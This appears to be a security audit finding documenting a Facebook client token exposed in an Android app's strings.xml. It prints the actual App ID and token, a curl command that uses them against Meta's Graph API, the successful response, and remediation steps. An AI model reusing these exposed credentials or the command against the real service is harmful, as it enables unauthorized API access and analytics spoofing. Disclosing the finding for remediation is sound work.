# Proof of Abuse — Facebook Client Token (RS-02)

**Finding:** Facebook App ID + Client Token in `strings.xml` allow **anyone** to query the Meta Graph API from any server without the Android app.

## Step 1 — Extract from APK

```xml
<string name="facebook_app_id">1060709268800467</string>
<string name="facebook_client_token">4d9333669ce4c9660134ca7ab8415840</string>
```

## Step 2 — Abuse from laptop

Meta documents `APP_ID|CLIENT_TOKEN` as an access token for **app-level** Graph API calls:

```bash
curl "https://graph.facebook.com/v19.0/1060709268800467?fields=id,name,link&access_token=1060709268800467%7C4d9333669ce4c9660134ca7ab8415840"
```

## Step 3 — Result

| Field | Value |
|-------|-------|
| HTTP status | **200 OK** |
| Response | `{"id":"1060709268800467","name":"ReelSaga New","link":"https://facebook.com/61574011225725"}` |

**Saved:** `01-graph-api-app-metadata.json`

## Impact

- Confirms token pair is **valid and active**
- Enables app-level Graph API enumeration (further endpoints may expose settings, roles if permissions allow)
- Combined with `AutoLogAppEventsEnabled=true`, increases analytics spoofing risk

## Reproduce

```bash
./app/scripts/03-verify-facebook-token.sh
```

## Fix

1. Rotate client token in [Meta Developer Console](https://developers.facebook.com/)
2. Restrict app to production package + signing cert hash
3. Review Advanced Access permissions
4. Disable auto app events if not required
